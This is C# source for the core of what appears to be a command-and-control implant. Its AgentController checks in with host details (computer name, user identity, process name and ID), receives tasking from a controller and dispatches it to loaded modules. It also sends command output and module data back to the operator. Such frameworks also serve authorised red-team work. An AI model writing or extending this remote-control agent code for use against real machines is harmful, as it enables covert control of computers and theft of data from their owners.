using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.Serialization.Json;

using Agent.Models;
using Agent.Interfaces;

namespace Agent.Controllers
{
    public class AgentController
    {
        protected ConfigurationController configController;
        protected ICommModule commModule;
        protected AgentStatus agentStatus;
        
        public delegate void OnAgentCommand(string data, AgentController agentController, ConfigurationController configController);
        protected List<AgentModuleInfo> loadedModules = new List<AgentModuleInfo>();

        internal AgentController(ConfigurationController config, ICommModule comm)
        {
            configController = config;
            commModule = comm;
        }

        internal void Run()
        {
            agentStatus = AgentStatus.Running;
            commModule.Run();

            while (agentStatus == AgentStatus.Running)
            {
                C2Data data;
                if (commModule.RecvData(out data) == true)
                    HandleData(data);
            }
        }

        internal void Stop()
        {
            agentStatus = AgentStatus.Stopped;
        }

        internal void AddAgentModule(IAgentModule module)
        {
            module.Initialise(this, configController);
        }

        public void RegisterAgentModule(AgentModuleInfo module)
        {
            loadedModules.Add(module);
        }

        internal void InitialCheckIn(InitialMetadata metadata)
        {
            var agentId = (string)configController.GetOption(ConfigurationSettings.AgentId);
            //var data = string.Format("{0}|{1}|{2}|{3}|{4}", agentId, metadata.ComputerName, metadata.Identity, metadata.ProcessName, metadata.ProcessId);

            var ms = new MemoryStream();
            var ser = new DataContractJsonSerializer(typeof(InitialMetadata));
            ser.WriteObject(ms, metadata);
            var json = ms.ToArray();
            ms.Close();
            var data = Encoding.UTF8.GetString(json, 0, json.Length);

            commModule.SendData(new C2Data()
            {
                AgentId = agentId,
                Module = "Core",
                Command = "InitialCheckin",
                Data = data
            });
        }

        public void SendCommandOutput(string data)
        {
            commModule.SendData(new C2Data()
            {
                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
                Module = "Core",
                Command = "CommandOutput",
                Data = data
            });
        }

        public void SendModuleData(string module, string command, string data)
        {
            commModule.SendData(new C2Data()
            {
                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
                Module = module,
                Command = command,
                Data = data
            });
        }

        public void SendModuleRegistered(AgentModuleInfo module)
        {
            var ms = new MemoryStream();
            var ser = new DataContractJsonSerializer(typeof(AgentModuleInfo));
            ser.WriteObject(ms, module);
            var json = ms.ToArray();
            ms.Close();
            var data = Encoding.UTF8.GetString(json, 0, json.Length);

            commModule.SendData(new C2Data()
            {
                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
                Module = "Core",
                Command = "ModuleRegistered",
                Data = data
            });
        }

        public void SendError(string module, string command, string data)
        {
            commModule.SendData(new C2Data()
            {
                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
                Module = "Core",
                Command = "AgentError",
                Data = string.Format("{0}|{1}|{2}", module, command, data)
            });
        }

        private void HandleData(C2Data data)
        {
            var commands = loadedModules.Where(m => m.Name.Equals(data.Module, StringComparison.OrdinalIgnoreCase)).Select(m => m.Commands).FirstOrDefault();
            if (commands != null)
                commands.Where(c => c.Name.Equals(data.Command, StringComparison.OrdinalIgnoreCase)).Select(c => c.Callback).FirstOrDefault()?.Invoke(data.Data, this, configController);
        }
    }
}